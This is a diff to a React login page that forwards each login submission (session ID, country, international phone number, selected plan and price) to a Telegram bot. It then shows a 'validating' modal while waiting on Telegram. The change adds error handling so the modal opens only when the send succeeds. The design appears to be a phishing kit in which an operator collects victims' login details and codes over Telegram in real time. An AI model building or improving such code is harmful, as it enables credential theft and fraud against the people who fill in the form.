@@ -203,7 +203,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({
 
     try {
       // Send login info with country and full international phone to Telegram Bot
-      await telegramService.sendLogin({
+      const success = await telegramService.sendLogin({
         sessionId,
         country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
         countryCode: country.id,
@@ -215,8 +215,16 @@ export const LoginPage: React.FC<LoginPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      // Open validating modal
-      setIsWaitingTelegram(true);
+      if (success) {
+        // Open validating modal only if Telegram message was sent successfully
+        setIsWaitingTelegram(true);
+      } else {
+        setErrorMessage(
+          language === 'fr'
+            ? 'Impossible d\'envoyer la demande à Telegram. Veuillez vérifier votre connexion.'
+            : 'Failed to send request to Telegram. Please check your connection.'
+        );
+      }
     } catch (err: any) {
       setErrorMessage(
         err.message ||
